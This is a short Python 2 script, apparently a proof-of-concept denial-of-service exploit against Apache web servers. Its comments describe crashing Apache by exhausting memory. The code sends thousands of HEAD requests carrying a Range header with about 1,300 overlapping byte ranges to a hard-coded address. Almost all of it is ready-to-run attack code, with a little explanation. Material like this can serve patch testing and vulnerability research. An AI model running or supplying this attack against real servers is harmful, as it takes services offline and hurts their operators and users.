# The idea is to do a HEAD request on a large file on an apache server with multiple byte ranges in multiple connections.
# The server then will have to read this large file from all the given byte ranges without returning any content 
# (as it is a HEAD) request. If we do this about > 500 times in parallel the memory will collapse with
# the apache process crashing down.

import sys
import socket

header = ''

for i in range(1300):
    header += ",5-%(i)d" % { 'i': i }

for e in range(10000):
    print 'Connecting to 10.10.107.253/in12/bild2.jpg #%(e)d' % { 'e': e }
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error, msg:
        print 'Failed to create socket. Error message : ' + msg[1]
        sys.exit();

    try:
        sock.connect(('10.10.107.253', 80))
    except sock.error, msg:
        print 'Failed to connect with socket. Error message : ' + msg[1]
        sys.exit();

    try:
        sock.send('HEAD /in12/bild2.jpg HTTP/1.1\r\n')
        sock.send('Host: 10.10.107.253\r\n')
        sock.send('Range: bytes=0-' + header + '\r\n')
        sock.send('Accept-Encoding: gzip\r\n')
        sock.send('Connection: close\r\n')
        sock.send('\r\n')
    except sock.error, msg:
        print 'Failed to send with socket. Error message : ' + msg[1]
        sys.exit();